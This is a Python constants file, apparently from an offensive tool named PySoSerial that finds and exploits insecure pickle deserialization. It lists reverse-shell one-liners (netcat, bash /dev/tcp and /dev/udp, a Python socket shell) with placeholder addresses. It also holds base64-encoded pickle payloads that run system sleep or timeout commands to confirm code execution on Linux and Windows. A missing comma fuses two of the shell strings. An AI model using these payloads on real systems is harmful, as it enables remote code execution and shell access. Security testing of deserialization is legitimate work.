


banner = """


██████╗░██╗░░░██╗░██████╗░█████╗░░██████╗███████╗██████╗░██╗░█████╗░██╗
██╔══██╗╚██╗░██╔╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║
██████╔╝░╚████╔╝░╚█████╗░██║░░██║╚█████╗░█████╗░░██████╔╝██║███████║██║
██╔═══╝░░░╚██╔╝░░░╚═══██╗██║░░██║░╚═══██╗██╔══╝░░██╔══██╗██║██╔══██║██║
██║░░░░░░░░██║░░░██████╔╝╚█████╔╝██████╔╝███████╗██║░░██║██║██║░░██║███████╗
╚═╝░░░░░░░░╚═╝░░░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚══════╝
                                                                                                        

[+] Tool for identification and exploitation of insecure deserialization vulnerabilities in python

"""


reverse_shells = [
"nc -e /bin/sh ip_placeholder port_placeholder",              # netcat
"nc -e /bin/bash ip_placeholder port_placeholder",
"nc -c bash ip_placeholder port_placeholder",
"bash -i >& /dev/tcp/ip_placeholder/port_placeholder 0>&1",   # bash TCP
"/bin/bash -l > /dev/tcp/ip_placeholder/port_placeholder 0<&1 2>&1",
"sh -i >& /dev/udp/ip_placeholder/port_placeholder 0>&1"      # bash UDP
"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip_placeholder\",port_placeholder));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
]


#TODO: sve picklati sa razlicitim verzijama pickle protokola


"""
SA SUBRPOCESS NIJE TAKO!!!!!!!!!!!!, koristiti subprocess umjesto os.sysyem?
"""

""" 
previously constructed payloads calling sleep [3,7] seconds
each payload is pickled with all 6 pickle protocols and base64 encoded

these are not generated on the fly for two reasons:
    1) efficiency
    2) considering that executing command relies on importing os module
       paylods differ on different operating systems
         - pickle payloads generated on linux will execute only if unpickling on linux aswell
         - the same goes for windows


"""


win_sleep_prepickled = [
    # timeout 3
    "Y250CnN5c3RlbQpwMAooVnRpbWVvdXQgMwpwMQp0cDIKUnAzCi4=",
    "Y250CnN5c3RlbQpxAChYCQAAAHRpbWVvdXQgM3EBdHECUnEDLg==",
    "gAJjbnQKc3lzdGVtCnEAWAkAAAB0aW1lb3V0IDNxAYVxAlJxAy4=",
    "gANjbnQKc3lzdGVtCnEAWAkAAAB0aW1lb3V0IDNxAYVxAlJxAy4=",
    "gASVIQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAl0aW1lb3V0IDOUhZRSlC4=",
    "gAWVIQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAl0aW1lb3V0IDOUhZRSlC4=",
    #timeout 7 
    "Y250CnN5c3RlbQpwMAooVnRpbWVvdXQgNwpwMQp0cDIKUnAzCi4=",
    "Y250CnN5c3RlbQpxAChYCQAAAHRpbWVvdXQgN3EBdHECUnEDLg==",
    "gAJjbnQKc3lzdGVtCnEAWAkAAAB0aW1lb3V0IDdxAYVxAlJxAy4=",
    "gANjbnQKc3lzdGVtCnEAWAkAAAB0aW1lb3V0IDdxAYVxAlJxAy4=",
    "gASVIQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAl0aW1lb3V0IDeUhZRSlC4=",
    "gAWVIQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAl0aW1lb3V0IDeUhZRSlC4="
]


nix_sleep_prepickled = [
    # sleep 3
    "Y3Bvc2l4CnN5c3RlbQpwMAooVnNsZWVwIDMKcDEKdHAyClJwMwou",
    "Y3Bvc2l4CnN5c3RlbQpxAChYBwAAAHNsZWVwIDNxAXRxAlJxAy4=",
    "gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCAzcQGFcQJScQMu",
    "gANjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCAzcQGFcQJScQMu",
    "gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCAzlIWUUpQu",
    "gAWVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCAzlIWUUpQu",
    #sleep 7 
    "Y3Bvc2l4CnN5c3RlbQpwMAooVnNsZWVwIDcKcDEKdHAyClJwMwou",
    "Y3Bvc2l4CnN5c3RlbQpxAChYBwAAAHNsZWVwIDdxAXRxAlJxAy4=",
    "gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA3cQGFcQJScQMu",
    "gANjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA3cQGFcQJScQMu",
    "gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA3lIWUUpQu",
    "gAWVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA3lIWUUpQu"
]

sleep_nix = [
    "sleep 3",
    "sleep 4",
    "sleep 5",
    "sleep 6"
]

sleep_win = [
    "timeout 3",
    "timeout 4",
    "timeout 5",
    "timeout 6"
]